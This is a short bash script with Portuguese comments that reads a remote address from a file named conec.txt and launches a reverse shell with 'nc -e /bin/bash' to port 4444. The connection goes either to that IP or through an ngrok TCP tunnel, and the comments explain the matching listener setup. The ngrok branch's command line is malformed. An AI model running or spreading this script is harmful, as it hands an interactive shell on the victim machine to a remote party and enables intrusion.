#!/bin/bash

#ngrok tcp port => abre a conexão tcp
#nc -nlvp port => fica escutando


IP=`head conec.txt -n 2`


LI=`wc -l conec.txt | awk -F " " '{ print $1 }'`

case $LI in
        1)
                NC=`nc -e /bin/bash $IP 4444 &`;;
        2)
                NG=`nc 0.tcp.sa.ngrok.io $IP 4444 -e /bin/bash &`;;
esac

